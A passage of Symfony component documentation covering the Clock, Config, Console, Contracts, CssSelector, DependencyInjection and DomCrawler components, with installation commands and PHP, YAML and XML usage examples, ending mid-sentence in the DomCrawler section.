            $clock = new MockClock('2022-11-16 15:20:00');
            $expirationChecker = new ExpirationChecker($clock);
            $validUntil = new DateTimeImmutable('2022-11-16 15:25:00');

            // $validUntil is in the future, so it is not expired
            static::assertFalse($expirationChecker->isExpired($validUntil));

            // Clock sleeps for 10 minutes, so now is '2022-11-16 15:30:00'
            $clock->sleep(600); // Instantly changes time as if we waited for 10 minutes (600 seconds)

            // modify the clock, accepts all formats supported by DateTimeImmutable::modify()
            static::assertTrue($expirationChecker->isExpired($validUntil));

            $clock->modify('2022-11-16 15:00:00');

            // $validUntil is in the future again, so it is no longer expired
            static::assertFalse($expirationChecker->isExpired($validUntil));
        }
    }

Monotonic Clock
~~~~~~~~~~~~~~~

The ``MonotonicClock`` allows you to implement a precise stopwatch; depending on
the system up to nanosecond precision. It can be used to measure the elapsed
time between two calls without being affected by inconsistencies sometimes introduced
by the system clock, e.g. by updating it. Instead, it consistently increases time,
making it especially useful for measuring performance.

.. _clock_use-inside-a-service:

Using a Clock inside a Service
------------------------------

Using the Clock component in your services to retrieve the current time makes
them easier to test. For example, by using the ``MockClock`` implementation as
the default one during tests, you will have full control to set the "current time"
to any arbitrary date/time.

In order to use this component in your services, make their classes use the
:class:`Symfony\\Component\\Clock\\ClockAwareTrait`. Thanks to
:ref:`service autoconfiguration <services-autoconfigure>`, the ``setClock()`` method
of the trait will automatically be called by the service container.

You can now call the ``$this->now()`` method to get the current time::

    namespace App\TimeUtils;

    use Symfony\Component\Clock\ClockAwareTrait;

    class MonthSensitive
    {
        use ClockAwareTrait;

        public function isWinterMonth(): bool
        {
            $now = $this->now();

            return match ($now->format('F')) {
                'December', 'January', 'February', 'March' => true,
                default => false,
            };
        }
    }

Thanks to the ``ClockAwareTrait``, and by using the ``MockClock`` implementation,
you can set the current time arbitrarily without having to change your service code.
This will help you test every case of your method without the need of actually
being in a month or another.

.. _clock_date-point:

The ``DatePoint`` Class
-----------------------

The Clock component uses a special :class:`Symfony\\Component\\Clock\\DatePoint`
class. This is a small wrapper on top of PHP's :phpclass:`DateTimeImmutable`.
You can use it seamlessly everywhere a :phpclass:`DateTimeImmutable` or
:phpclass:`DateTimeInterface` is expected. The ``DatePoint`` object fetches the
date and time from the :class:`Symfony\\Component\\Clock\\Clock` class. This means
that if you did any changes to the clock as stated in the
:ref:`usage section <clock_usage>`, it will be reflected when creating a new
``DatePoint``. You can also create a new ``DatePoint`` instance directly, for
instance when using it as a default value::

    use Symfony\Component\Clock\DatePoint;

    class Post
    {
        public function __construct(
            // ...
            private \DateTimeImmutable $createdAt = new DatePoint(),
        ) {
        }
    }

The constructor also allows setting a timezone or custom referenced date::

    // you can specify a timezone
    $withTimezone = new DatePoint(timezone: new \DateTimezone('UTC'));

    // you can also create a DatePoint from a reference date
    $referenceDate = new \DateTimeImmutable();
    $relativeDate = new DatePoint('+1month', reference: $referenceDate);

The ``DatePoint`` class also provides a named constructor to create dates from
timestamps::

    $dateOfFirstCommitToSymfonyProject = DatePoint::createFromTimestamp(1129645656);
    // equivalent to:
    // $dateOfFirstCommitToSymfonyProject = (new \DateTimeImmutable())->setTimestamp(1129645656);

    // negative timestamps (for dates before January 1, 1970) and float timestamps
    // (for high precision sub-second datetimes) are also supported
    $dateOfFirstMoonLanding = DatePoint::createFromTimestamp(-14182940);

.. versionadded:: 7.1

    The ``createFromTimestamp()`` method was introduced in Symfony 7.1.

.. note::

    In addition ``DatePoint`` offers stricter return types and provides consistent
    error handling across versions of PHP, thanks to polyfilling `PHP 8.3's behavior`_
    on the topic.

``DatePoint`` also allows to set and get the microsecond part of the date and time::

    $datePoint = new DatePoint();
    $datePoint->setMicrosecond(345);
    $microseconds = $datePoint->getMicrosecond();

.. note::

    This feature polyfills PHP 8.4's behavior on the topic, as microseconds manipulation
    is not available in previous versions of PHP.

.. versionadded:: 7.1

    The :method:`Symfony\\Component\\Clock\\DatePoint::setMicrosecond` and
    :method:`Symfony\\Component\\Clock\\DatePoint::getMicrosecond` methods were
    introduced in Symfony 7.1.

.. _clock_writing-tests:

Writing Time-Sensitive Tests
----------------------------

The Clock component provides another trait, called :class:`Symfony\\Component\\Clock\\Test\\ClockSensitiveTrait`,
to help you write time-sensitive tests. This trait provides methods to freeze
time and restore the global clock after each test.

Use the ``ClockSensitiveTrait::mockTime()`` method to interact with the mocked
clock in your tests. This method accepts different types as its only argument:

* A string, which can be a date to set the clock at (e.g. ``1996-07-01``) or an
  interval to modify the clock (e.g. ``+2 days``);
* A ``DateTimeImmutable`` to set the clock at;
* A boolean, to freeze or restore the global clock.

Let's say you want to test the method ``MonthSensitive::isWinterMonth()`` of the
above example. This is how you can write that test::

    namespace App\Tests\TimeUtils;

    use App\TimeUtils\MonthSensitive;
    use PHPUnit\Framework\TestCase;
    use Symfony\Component\Clock\Test\ClockSensitiveTrait;

    class MonthSensitiveTest extends TestCase
    {
        use ClockSensitiveTrait;

        public function testIsWinterMonth(): void
        {
            $clock = static::mockTime(new \DateTimeImmutable('2022-03-02'));

            $monthSensitive = new MonthSensitive();
            $monthSensitive->setClock($clock);

            $this->assertTrue($monthSensitive->isWinterMonth());
        }

        public function testIsNotWinterMonth(): void
        {
            $clock = static::mockTime(new \DateTimeImmutable('2023-06-02'));

            $monthSensitive = new MonthSensitive();
            $monthSensitive->setClock($clock);

            $this->assertFalse($monthSensitive->isWinterMonth());
        }
    }

This test will behave the same no matter which time of the year you run it.
By combining the :class:`Symfony\\Component\\Clock\\ClockAwareTrait` and
:class:`Symfony\\Component\\Clock\\Test\\ClockSensitiveTrait`, you have full
control on your time-sensitive code's behavior.

Exceptions Management
---------------------

The Clock component takes full advantage of some `PHP DateTime exceptions`_.
If you pass an invalid string to the clock (e.g. when creating a clock or
modifying a ``MockClock``) you'll get a ``DateMalformedStringException``. If you
pass an invalid timezone, you'll get a ``DateInvalidTimeZoneException``::

    $userInput = 'invalid timezone';

    try {
        $clock = Clock::get()->withTimeZone($userInput);
    } catch (\DateInvalidTimeZoneException $exception) {
        // ...
    }

These exceptions are available starting from PHP 8.3. However, thanks to the
`symfony/polyfill-php83`_ dependency required by the Clock component, you can
use them even if your project doesn't use PHP 8.3 yet.

.. _`PSR-20`: https://www.php-fig.org/psr/psr-20/
.. _`accepted by the DateTime constructor`: https://www.php.net/manual/en/datetime.formats.php
.. _`PHP DateTime exceptions`: https://wiki.php.net/rfc/datetime-exceptions
.. _`symfony/polyfill-php83`: https://github.com/symfony/polyfill-php83
.. _`PHP 8.3's behavior`: https://wiki.php.net/rfc/datetime-exceptions
The Config Component
====================

    The Config component provides several classes to help you find, load,
    combine, fill and validate configuration values of any kind, whatever
    their source may be (YAML, XML, INI files, or for instance a database).

Installation
------------

.. code-block:: terminal

    $ composer require symfony/config

.. include:: /components/require_autoload.rst.inc

Learn More
----------

.. toctree::
    :maxdepth: 1
    :glob:

    config/*
    /bundles/configuration
    /bundles/extension
    /bundles/prepend_extension
The Console Component
=====================

    The Console component eases the creation of beautiful and testable command
    line interfaces.

The Console component allows you to create command-line commands. Your console
commands can be used for any recurring task, such as cronjobs, imports, or
other batch jobs.

Installation
------------

.. code-block:: terminal

    $ composer require symfony/console

.. include:: /components/require_autoload.rst.inc

Creating a Console Application
------------------------------

.. seealso::

    This article explains how to use the Console features as an independent
    component in any PHP application. Read the :doc:`/console` article to
    learn about how to use it in Symfony applications.

First, you need to create a PHP script to define the console application::

    #!/usr/bin/env php
    <?php
    // application.php

    require __DIR__.'/vendor/autoload.php';

    use Symfony\Component\Console\Application;

    $application = new Application();

    // ... register commands

    $application->run();

Then, you can register the commands using
:method:`Symfony\\Component\\Console\\Application::add`::

    // ...
    $application->add(new GenerateAdminCommand());

You can also register inline commands and define their behavior thanks to the
``Command::setCode()`` method::

    // ...
    $application->register('generate-admin')
        ->addArgument('username', InputArgument::REQUIRED)
        ->setCode(function (InputInterface $input, OutputInterface $output): int {
            // ...

            return Command::SUCCESS;
        });

This is useful when creating a :doc:`single-command application </components/console/single_command_tool>`.

See the :doc:`/console` article for information about how to create commands.

Learn more
----------

.. toctree::
    :maxdepth: 1
    :glob:

    /console
    /components/console/*
    /console/*
The Contracts Component
=======================

    The Contracts component provides a set of abstractions extracted out of the
    Symfony components. They can be used to build on semantics that the Symfony
    components proved useful - and that already have battle-tested implementations.

Installation
------------

Contracts are provided as separate packages, so you can install only the ones
your projects really need:

.. code-block:: terminal

    $ composer require symfony/cache-contracts
    $ composer require symfony/event-dispatcher-contracts
    $ composer require symfony/deprecation-contracts
    $ composer require symfony/http-client-contracts
    $ composer require symfony/service-contracts
    $ composer require symfony/translation-contracts

.. include:: /components/require_autoload.rst.inc

Usage
-----

The abstractions in this package are useful to achieve loose coupling and
interoperability. By using the provided interfaces as type hints, you are able
to reuse any implementations that match their contracts. It could be a Symfony
component, or another package provided by the PHP community at large.

Depending on their semantics, some interfaces can be combined with
:doc:`autowiring </service_container/autowiring>` to seamlessly inject a service
in your classes.

Others might be useful as labeling interfaces, to hint about a specific behavior
that can be enabled when using :ref:`autoconfiguration <services-autoconfigure>`
or manual :doc:`service tagging </service_container/tags>` (or any other means
provided by your framework.)

Design Principles
-----------------

* Contracts are split by domain, each into their own sub-namespaces;
* Contracts are small and consistent sets of PHP interfaces, traits, normative
  docblocks and reference test suites when applicable, ...;
* Contracts must have a proven implementation to enter this repository;
* Contracts must be backward compatible with existing Symfony components.

Packages that implement specific contracts should list them in the ``provide``
section of their ``composer.json`` file, using the ``symfony/*-implementation``
convention. For example:

.. code-block:: javascript

    {
        "...": "...",
        "provide": {
            "symfony/cache-implementation": "3.0"
        }
    }

Frequently Asked Questions
--------------------------

How Is this Different From PHP-FIG's PSRs?
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

When applicable, the provided contracts are built on top of `PHP-FIG`_'s PSRs.
However, PHP-FIG has different goals and different processes. Symfony Contracts
focuses  on providing abstractions that are useful on their own while still
compatible with implementations provided by Symfony.

.. _`PHP-FIG`: https://www.php-fig.org/
The CssSelector Component
=========================

    The CssSelector component converts CSS selectors to `XPath`_ expressions.

Installation
------------

.. code-block:: terminal

    $ composer require symfony/css-selector

.. include:: /components/require_autoload.rst.inc

Usage
-----

.. seealso::

    This article explains how to use the CssSelector features as an independent
    component in any PHP application. Read the :ref:`Symfony Functional Tests <functional-tests>`
    article to learn about how to use it when creating Symfony tests.

Why Use CSS selectors?
~~~~~~~~~~~~~~~~~~~~~~

When you're parsing an HTML or an XML document, by far the most powerful
method is `XPath`_.

XPath expressions are incredibly flexible, so there is almost always an
XPath expression that will find the element you need. Unfortunately, they
can also become very complicated, and the learning curve is steep. Even common
operations (such as finding an element with a particular class) can require
long and unwieldy expressions.

Many developers -- particularly web developers -- are more comfortable
using CSS selectors to find elements. As well as working in stylesheets,
CSS selectors are used in JavaScript with the ``querySelectorAll()`` function
and in popular JavaScript libraries such as jQuery.

CSS selectors are less powerful than XPath, but far easier to write, read
and understand. Since they are less powerful, almost all CSS selectors can
be converted to an XPath equivalent. This XPath expression can then be used
with other functions and classes that use XPath to find elements in a
document.

The CssSelector Component
~~~~~~~~~~~~~~~~~~~~~~~~~

The component's only goal is to convert CSS selectors to their XPath
equivalents, using :method:`Symfony\\Component\\CssSelector\\CssSelectorConverter::toXPath`::

    use Symfony\Component\CssSelector\CssSelectorConverter;

    $converter = new CssSelectorConverter();
    var_dump($converter->toXPath('div.item > h4 > a'));

This gives the following output:

.. code-block:: text

    descendant-or-self::div[@class and contains(concat(' ',normalize-space(@class), ' '), ' item ')]/h4/a

You can use this expression with, for instance, :phpclass:`DOMXPath` or
:phpclass:`SimpleXMLElement` to find elements in a document.

.. tip::

    The :method:`Crawler::filter() <Symfony\\Component\\DomCrawler\\Crawler::filter>` method
    uses the CssSelector component to find elements based on a CSS selector
    string. See the :doc:`/components/dom_crawler` for more details.

Limitations of the CssSelector Component
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Not all CSS selectors can be converted to `XPath`_ equivalents.

There are several CSS selectors that only make sense in the context of a
web-browser.

* link-state selectors: ``:link``, ``:visited``, ``:target``
* selectors based on user action: ``:hover``, ``:focus``, ``:active``
* UI-state selectors: ``:invalid``, ``:indeterminate`` (however, ``:enabled``,
  ``:disabled``, ``:checked`` and ``:unchecked`` are available)

Pseudo-elements (``:before``, ``:after``, ``:first-line``,
``:first-letter``) are not supported because they select portions of text
rather than elements.

Pseudo-classes are partially supported:

* Not supported: ``*:first-of-type``, ``*:last-of-type``, ``*:nth-of-type`` and
  ``*:nth-last-of-type`` (all these work with an element name (e.g.
  ``li:first-of-type``) but not with the ``*`` selector).
* Supported: ``*:only-of-type``, ``*:scope``, ``*:is`` and ``*:where``.

.. versionadded:: 7.1

    The support for ``*:is`` and ``*:where`` was introduced in Symfony 7.1.

Learn more
----------

* :doc:`/testing`
* :doc:`/components/dom_crawler`

.. _`XPath`: https://en.wikipedia.org/wiki/XPath
The DependencyInjection Component
=================================

    The DependencyInjection component implements a `PSR-11`_ compatible service
    container that allows you to standardize and centralize the way objects are
    constructed in your application.

For an introduction to Dependency Injection and service containers see
:doc:`/service_container`.

Installation
------------

.. code-block:: terminal

    $ composer require symfony/dependency-injection

.. include:: /components/require_autoload.rst.inc

Basic Usage
-----------

.. seealso::

    This article explains how to use the DependencyInjection features as an
    independent component in any PHP application. Read the :doc:`/service_container`
    article to learn about how to use it in Symfony applications.

You might have a class like the following ``Mailer`` that
you want to make available as a service::

    class Mailer
    {
        private string $transport;

        public function __construct()
        {
            $this->transport = 'sendmail';
        }

        // ...
    }

You can register this in the container as a service::

    use Symfony\Component\DependencyInjection\ContainerBuilder;

    $container = new ContainerBuilder();
    $container->register('mailer', 'Mailer');

An improvement to the class to make it more flexible would be to allow
the container to set the ``transport`` used. If you change the class
so this is passed into the constructor::

    class Mailer
    {
        public function __construct(
            private string $transport,
        ) {
        }

        // ...
    }

Then you can set the choice of transport in the container::

    use Symfony\Component\DependencyInjection\ContainerBuilder;

    $container = new ContainerBuilder();
    $container
        ->register('mailer', 'Mailer')
        ->addArgument('sendmail');

This class is now much more flexible as you have separated the choice of
transport out of the implementation and into the container.

Which mail transport you have chosen may be something other services need
to know about. You can avoid having to change it in multiple places by making
it a parameter in the container and then referring to this parameter for
the ``Mailer`` service's constructor argument::

    use Symfony\Component\DependencyInjection\ContainerBuilder;

    $container = new ContainerBuilder();
    $container->setParameter('mailer.transport', 'sendmail');
    $container
        ->register('mailer', 'Mailer')
        ->addArgument('%mailer.transport%');

Now that the ``mailer`` service is in the container you can inject it as
a dependency of other classes. If you have a ``NewsletterManager`` class
like this::

    class NewsletterManager
    {
        public function __construct(
            private \Mailer $mailer,
        ) {
        }

        // ...
    }

When defining the ``newsletter_manager`` service, the ``mailer`` service does
not exist yet. Use the ``Reference`` class to tell the container to inject the
``mailer`` service when it initializes the newsletter manager::

    use Symfony\Component\DependencyInjection\ContainerBuilder;
    use Symfony\Component\DependencyInjection\Reference;

    $container = new ContainerBuilder();

    $container->setParameter('mailer.transport', 'sendmail');
    $container
        ->register('mailer', 'Mailer')
        ->addArgument('%mailer.transport%');

    $container
        ->register('newsletter_manager', 'NewsletterManager')
        ->addArgument(new Reference('mailer'));

If the ``NewsletterManager`` did not require the ``Mailer`` and injecting
it was only optional then you could use setter injection instead::

    class NewsletterManager
    {
        private \Mailer $mailer;

        public function setMailer(\Mailer $mailer): void
        {
            $this->mailer = $mailer;
        }

        // ...
    }

You can now choose not to inject a ``Mailer`` into the ``NewsletterManager``.
If you do want to though then the container can call the setter method::

    use Symfony\Component\DependencyInjection\ContainerBuilder;
    use Symfony\Component\DependencyInjection\Reference;

    $container = new ContainerBuilder();

    $container->setParameter('mailer.transport', 'sendmail');
    $container
        ->register('mailer', 'Mailer')
        ->addArgument('%mailer.transport%');

    $container
        ->register('newsletter_manager', 'NewsletterManager')
        ->addMethodCall('setMailer', [new Reference('mailer')]);

You could then get your ``newsletter_manager`` service from the container
like this::

    use Symfony\Component\DependencyInjection\ContainerBuilder;

    $container = new ContainerBuilder();

    // ...

    $newsletterManager = $container->get('newsletter_manager');

Getting Services That Don't Exist
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

By default, when you try to get a service that doesn't exist, you see an exception.
You can override this behavior as follows::

    use Symfony\Component\DependencyInjection\ContainerBuilder;
    use Symfony\Component\DependencyInjection\ContainerInterface;

    $containerBuilder = new ContainerBuilder();

    // ...

    // the second argument is optional and defines what to do when the service doesn't exist
    $newsletterManager = $containerBuilder->get('newsletter_manager', ContainerInterface::EXCEPTION_ON_INVALID_REFERENCE);

These are all the possible behaviors:

 * ``ContainerInterface::EXCEPTION_ON_INVALID_REFERENCE``: throws an exception
   at compile time (this is the **default** behavior);
 * ``ContainerInterface::RUNTIME_EXCEPTION_ON_INVALID_REFERENCE``: throws an
   exception at runtime, when trying to access the missing service;
 * ``ContainerInterface::NULL_ON_INVALID_REFERENCE``: returns ``null``;
 * ``ContainerInterface::IGNORE_ON_INVALID_REFERENCE``: ignores the wrapping
   command asking for the reference (for instance, ignore a setter if the service
   does not exist);
 * ``ContainerInterface::IGNORE_ON_UNINITIALIZED_REFERENCE``: ignores/returns
   ``null`` for uninitialized services or invalid references.

Avoiding your Code Becoming Dependent on the Container
------------------------------------------------------

Whilst you can retrieve services from the container directly it is best
to minimize this. For example, in the ``NewsletterManager`` you injected
the ``mailer`` service in rather than asking for it from the container.
You could have injected the container in and retrieved the ``mailer`` service
from it but it would then be tied to this particular container making it
difficult to reuse the class elsewhere.

You will need to get a service from the container at some point but this
should be as few times as possible at the entry point to your application.

.. _components-dependency-injection-loading-config:

Setting up the Container with Configuration Files
-------------------------------------------------

As well as setting up the services using PHP as above you can also use
configuration files. This allows you to use XML or YAML to write the definitions
for the services rather than using PHP to define the services as in the
above examples. In anything but the smallest applications it makes sense
to organize the service definitions by moving them into one or more configuration
files. To do this you also need to install
:doc:`the Config component </components/config>`.

Loading an XML config file::

    use Symfony\Component\Config\FileLocator;
    use Symfony\Component\DependencyInjection\ContainerBuilder;
    use Symfony\Component\DependencyInjection\Loader\XmlFileLoader;

    $container = new ContainerBuilder();
    $loader = new XmlFileLoader($container, new FileLocator(__DIR__));
    $loader->load('services.xml');

Loading a YAML config file::

    use Symfony\Component\Config\FileLocator;
    use Symfony\Component\DependencyInjection\ContainerBuilder;
    use Symfony\Component\DependencyInjection\Loader\YamlFileLoader;

    $container = new ContainerBuilder();
    $loader = new YamlFileLoader($container, new FileLocator(__DIR__));
    $loader->load('services.yaml');

.. note::

    If you want to load YAML config files then you will also need to install
    :doc:`the Yaml component </components/yaml>`.

.. tip::

    If your application uses unconventional file extensions (for example, your
    XML files have a ``.config`` extension) you can pass the file type as the
    second optional parameter of the ``load()`` method::

        // ...
        $loader->load('services.config', 'xml');

If you *do* want to use PHP to create the services then you can move this
into a separate config file and load it in a similar way::

    use Symfony\Component\Config\FileLocator;
    use Symfony\Component\DependencyInjection\ContainerBuilder;
    use Symfony\Component\DependencyInjection\Loader\PhpFileLoader;

    $container = new ContainerBuilder();
    $loader = new PhpFileLoader($container, new FileLocator(__DIR__));
    $loader->load('services.php');

You can now set up the ``newsletter_manager`` and ``mailer`` services using
config files:

.. configuration-block::

    .. code-block:: yaml

        parameters:
            # ...
            mailer.transport: sendmail

        services:
            mailer:
                class:     Mailer
                arguments: ['%mailer.transport%']
            newsletter_manager:
                class:     NewsletterManager
                calls:
                    - [setMailer, ['@mailer']]

    .. code-block:: xml

        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd"
        >
            <parameters>
                <!-- ... -->
                <parameter key="mailer.transport">sendmail</parameter>
            </parameters>

            <services>
                <service id="mailer" class="Mailer">
                    <argument>%mailer.transport%</argument>
                </service>

                <service id="newsletter_manager" class="NewsletterManager">
                    <call method="setMailer">
                        <argument type="service" id="mailer"/>
                    </call>
                </service>
            </services>
        </container>

    .. code-block:: php

        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        return static function (ContainerConfigurator $container): void {
            $container->parameters()
                // ...
                ->set('mailer.transport', 'sendmail')
            ;

            $services = $container->services();
            $services->set('mailer', 'Mailer')
                ->args(['%mailer.transport%'])
            ;

            $services->set('mailer', 'Mailer')
                ->args([param('mailer.transport')])
            ;

            $services->set('newsletter_manager', 'NewsletterManager')
                ->call('setMailer', [service('mailer')])
            ;
        };

Learn More
----------

.. toctree::
    :maxdepth: 1
    :glob:

    /components/dependency_injection/*
    /service_container/*

.. _`PSR-11`: https://www.php-fig.org/psr/psr-11/
The DomCrawler Component
========================

    The DomCrawler component eases DOM navigation for HTML and XML documents.

.. note::

    While possible, the DomCrawler component is not designed for manipulation
    of the DOM or re-dumping HTML/XML.

Installation
------------

.. code-block:: terminal

    $ composer require symfony/dom-crawler

.. include:: /components/require_autoload.rst.inc

Usage
-----

.. seealso::

    This article explains how to use the DomCrawler features as an independent
    component in any PHP application. Read the :ref:`Symfony Functional Tests <functional-tests>`
    article to learn about how to use it when creating Symfony tests.

The :class:`Symfony\\Component\\DomCrawler\\Crawler` class provides methods
to query and manipulate HTML and XML documents.

An instance of the Crawler represents a set of :phpclass:`DOMElement` objects,
which are nodes that can be traversed as follows::

    use Symfony\Component\DomCrawler\Crawler;

    $html = <<<'HTML'
    <!DOCTYPE html>
    <html>
        <body>
            <p class="message">Hello World!</p>
            <p>Hello Crawler!</p>
        </body>
    </html>
    HTML;

    $crawler = new Crawler($html);

    foreach ($crawler as $domElement) {
        var_dump($domElement->nodeName);
    }

Specialized :class:`Symfony\\Component\\DomCrawler\\Link`,
:class:`Symfony\\Component\\DomCrawler\\Image` and
:class:`Symfony\\Component\\DomCrawler\\Form` classes are useful for
interacting with html links, images and forms as you traverse through the HTML
tree.

.. note::

    The DomCrawler will attempt to automatically fix your HTML to match the
    official specification. For example, if you nest a ``<p>`` tag inside
    another ``<p>`` tag, it will be moved to be a sibling of the parent tag.
    This is expected and is part of the HTML5 spec. But if you're getting
    unexpected behavior, this could be a cause. And while the DomCrawler
    isn't meant to dump content, you can see the "fixed" version of your HTML
    by :ref:`dumping it <component-dom-crawler-dumping>`.

Node Filtering
~~~~~~~~~~~~~~

Using XPath expressions, you can select specific nodes within the document::

    $crawler = $crawler->filterXPath('descendant-or-self::body/p');

.. tip::

    ``DOMXPath::query`` is used internally to actually perform an XPath query.

If you prefer CSS selectors over XPath, install :doc:`/components/css_selector`.
It allows you to use jQuery-like selectors::

    $crawler = $crawler->filter('body > p');

An anonymous function can be used to filter with more complex criteria::

    use Symfony\Component\DomCrawler\Crawler;
    // ...

    $crawler = $crawler
        ->filter('body > p')
        ->reduce(function (Crawler $node, $i): bool {
            // filters every other node
            return ($i % 2) === 0;
        });

To remove a node, the anonymous function must return ``false``.

.. note::

    All filter methods return a new :class:`Symfony\\Component\\DomCrawler\\Crawler`
    instance with the filtered content. To check if the filter actually
    found something, use ``$crawler->count() > 0`` on this new crawler.

Both the :method:`Symfony\\Component\\DomCrawler\\Crawler::filterXPath` and
:method:`Symfony\\Component\\DomCrawler\\Crawler::filter` methods work with
XML namespaces, which can be either automatically discovered or registered
explicitly.

Consider the XML below:

.. code-block:: xml

    <?xml version="1.0" encoding="UTF-8" ?>
    <entry
        xmlns="http://www.w3.org/2005/Atom"
        xmlns:media="http://search.yahoo.com/mrss/"
        xmlns:yt="http://gdata.youtube.com/schemas/2007"
    >
        <id>tag:youtube.com,2008:video:kgZRZmEc9j4</id>
        <yt:accessControl action="comment" permission="allowed"/>
        <yt:accessControl action="videoRespond" permission="moderated"/>
        <media:group>
            <media:title type="plain">Chordates - CrashCourse Biology #24</media:title>
            <yt:aspectRatio>widescreen</yt:aspectRatio>
        </media:group>
    </entry>

This can be filtered with the  ``Crawler`` without needing to register namespace
aliases both with :method:`Symfony\\Component\\DomCrawler\\Crawler::filterXPath`::

    $crawler = $crawler->filterXPath('//default:entry/media:group//yt:aspectRatio');

and :method:`Symfony\\Component\\DomCrawler\\Crawler::filter`::

    $crawler = $crawler->filter('default|entry media|group yt|aspectRatio');

.. note::

    The default namespace is registered with a prefix "default". It can be
    changed with the
    :method:`Symfony\\Component\\DomCrawler\\Crawler::setDefaultNamespacePrefix`
    method.

    The default namespace is removed when loading the content if it's the only
    namespace in the document. It's done to simplify the XPath queries.

Namespaces can be explicitly registered with the
:method:`Symfony\\Component\\DomCrawler\\Crawler::registerNamespace` method::

    $crawler->registerNamespace('m', 'http://search.yahoo.com/mrss/');
    $crawler = $crawler->filterXPath('//m:group//yt:aspectRatio');

Verify if the current node matches a selector::

    $crawler->matches('p.lorem');

Node Traversing
~~~~~~~~~~~~~~~

Access node by its position on the list::

    $crawler->filter('body > p')->eq(0);

Get the first or last node of the current selection::

    $crawler->filter('body > p')->first();
    $crawler->filter('body > p')->last();

Get the nodes of the same level as the current selection::

    $crawler->filter('body > p')->siblings();

Get the same level nodes after or before the current selection::

    $crawler->filter('body > p')->nextAll();
    $crawler->filter('body > p')->previousAll();

Get all the child or ancestor nodes::

    $crawler->filter('body')->children();
    $crawler->filter('body > p')->ancestors();

Get all the direct child nodes matching a CSS selector::

    $crawler->filter('body')->children('p.lorem');

Get the first parent (heading toward the document root) of the element that matches the provided selector::

    $crawler->closest('p.lorem');

.. note::

    All the traversal methods return a new :class:`Symfony\\Component\\DomCrawler\\Crawler`
    instance.

Accessing Node Values
~~~~~~~~~~~~~~~~~~~~~

Access the node name (HTML tag name) of the first node of the current selection (e.g. "p" or "div")::

    // returns the node name (HTML tag name) of the first child element under <body>
    $tag = $crawler->filterXPath('//body/*')->nodeName();

Access the value of the first node of the current selection::

    // if the node does not exist, calling to text() will result in an exception
    $message = $crawler->filterXPath('//body/p')->text();

    // avoid the exception passing an argument that text() returns when node does not exist
    $message = $crawler->filterXPath('//body/p')->text('Default text content');

    // by default, text() trims whitespace characters, including the internal ones
    // (e.g. "  foo\n  bar    baz \n " is returned as "foo bar baz")
    // pass FALSE as the second argument to return the original text unchanged
    $crawler->filterXPath('//body/p')->text('Default text content', false);

    // innerText() is similar to text() but returns only text that is a direct
    // descendant of the current node, excluding text from child nodes
    $text = $crawler->filterXPath('//body/p')->innerText();
    // if content is <p>Foo <span>Bar</span></p> or <p><span>Bar</span> Foo</p>
    // innerText() returns 'Foo' in both cases; and text() returns 'Foo Bar' and 'Bar Foo' respectively

    // if there are multiple text nodes, between other child nodes, like
    // <p>Foo <span>Bar</span> Baz</p>
    // innerText() returns only the first text node 'Foo'

    // like text(), innerText() also trims whitespace characters by default,
    // but you can get the unchanged text by passing FALSE as argument
    $text = $crawler->filterXPath('//body/p')->innerText(false);

Access the attribute value of the first node of the current selection::

    $class = $crawler->filterXPath('//body/p')->attr('class');

.. tip::

    You can define the default value to use if the node or attribute is empty
    by using the second argument of the ``attr()`` method::

        $class = $crawler->filterXPath('//body/p')->attr('class', 'my-default-class');

Extract attribute and/or node values from the list of nodes::

    $attributes = $crawler
        ->filterXpath('//body/p')
        ->extract(['_name', '_text', 'class'])
    ;

.. note::

    Special attribute ``_text`` represents a node value, while ``_name``
    represents the element name (the HTML tag name).

Call an anonymous function on each node of the list::

    use Symfony\Component\DomCrawler\Crawler;
    // ...

    $nodeValues = $crawler->filter('p')->each(function (Crawler $node, $i): string {
        return $node->text();
    });

The anonymous function receives the node (as a Crawler) and the position as arguments.
The result is an array of values returned by the anonymous function calls.

When using nested crawler, beware that ``filterXPath()`` is evaluated in the
context of the crawler::

    $crawler->filterXPath('parent')->each(function (Crawler $parentCrawler, $i): avoid {
        // DON'T DO THIS: direct child can not be found
        $subCrawler = $parentCrawler->filterXPath('sub-tag/sub-child-tag');

        // DO THIS: specify the parent tag too
        $subCrawler = $parentCrawler->filterXPath('parent/sub-tag/sub-child-tag');
        $subCrawler = $parentCrawler->filterXPath('node()/sub-tag/sub-child-tag');
    });

Adding the Content
~~~~~~~~~~~~~~~~~~

The crawler supports multiple ways of adding the content, but they are mutually
exclusive, so you can only use one of them to add content (e.g. if you pass the
content to the ``Crawler`` constructor, you can't call ``addContent()`` later)::

    $crawler = new Crawler('<html><body/></html>');

    $crawler->addHtmlContent('<html><body/></html>');
    $crawler->addXmlContent('<root><node/></root>');

    $crawler->addContent('<html><body/></html>');
    $crawler->addContent('<root><node/></root>', 'text/xml');

    $crawler->add('<html><body/></html>');
    $crawler->add('<root><node/></root>');

.. note::

    The :method:`Symfony\\Component\\DomCrawler\\Crawler::addHtmlContent` and
    :method:`Symfony\\Component\\DomCrawler\\Crawler::addXmlContent` methods
    default to UTF-8 encoding but you can change this behavior with their second
    optional argument.

    The :method:`Symfony\\Component\\DomCrawler\\Crawler::addContent` method
    guesses the best charset according to the given contents and defaults to
    ``ISO-8859-1`` in case no charset can be guessed.

As the Crawler's implementation is based on the DOM extension, it is also able
to interact with native :phpclass:`DOMDocument`, :phpclass:`DOMNodeList`
and :phpclass:`DOMNode` objects::

    $domDocument = new \DOMDocument();
    $domDocument->loadXml('<root><node/><node/></root>');
    $nodeList = $domDocument->getElementsByTagName('node');
    $node = $domDocument->getElementsByTagName('node')->item(0);

    $crawler->addDocument($domDocument);
    $crawler->addNodeList($nodeList);
    $crawler->addNodes([$node]);
    $crawler->addNode($node);
    $crawler->add($domDocument);

.. _component-dom-crawler-dumping:

.. sidebar:: Manipulating and Dumping a ``Crawler``

    These methods on the ``Crawler`` are intended to initially populate your
    ``Crawler`` and aren't intended to be used to further manipulate a DOM
    (though this is possible). However, since the ``Crawler`` is a set of
    :phpclass:`DOMElement` objects, you can use any method or property available
